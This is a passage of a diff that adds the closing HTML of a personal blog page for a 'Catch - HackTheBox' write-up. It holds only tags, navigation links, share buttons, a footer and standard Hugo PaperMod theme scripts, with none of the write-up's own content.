+      <li><a href="https://suszczyk.github.io/tags/medium/">Medium</a></li>
+      <li><a href="https://suszczyk.github.io/tags/retired/">Retired</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://suszczyk.github.io/posts/hackthebox/logforge/">
+    <span class="title">« Prev Page</span>
+    <br>
+    <span>LogForge - HackTheBox</span>
+  </a>
+  <a class="next" href="https://suszczyk.github.io/posts/vulnhub/development/">
+    <span class="title">Next Page »</span>
+    <br>
+    <span>Development</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Catch - HackTheBox on twitter"
+        href="https://twitter.com/intent/tweet/?text=Catch%20-%20HackTheBox&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fcatch%2f&amp;hashtags=Linux%2cMedium%2cRetired">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Catch - HackTheBox on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fcatch%2f&amp;title=Catch%20-%20HackTheBox&amp;summary=Catch%20-%20HackTheBox&amp;source=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fcatch%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Catch - HackTheBox on reddit"
+        href="https://reddit.com/submit?url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fcatch%2f&title=Catch%20-%20HackTheBox">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Catch - HackTheBox on facebook"
+        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fcatch%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Catch - HackTheBox on whatsapp"
+        href="https://api.whatsapp.com/send?text=Catch%20-%20HackTheBox%20-%20https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fcatch%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Catch - HackTheBox on telegram"
+        href="https://telegram.me/share/url?text=Catch%20-%20HackTheBox&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fcatch%2f">
+        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
+            <path
+                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+        </svg>
+    </a>
+</div>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://suszczyk.github.io">Mateusz Suszczyk</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = 'copy';
+
+        function copyingDone() {
+            copybutton.innerText = 'copied!';
+            setTimeout(() => {
+                copybutton.innerText = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
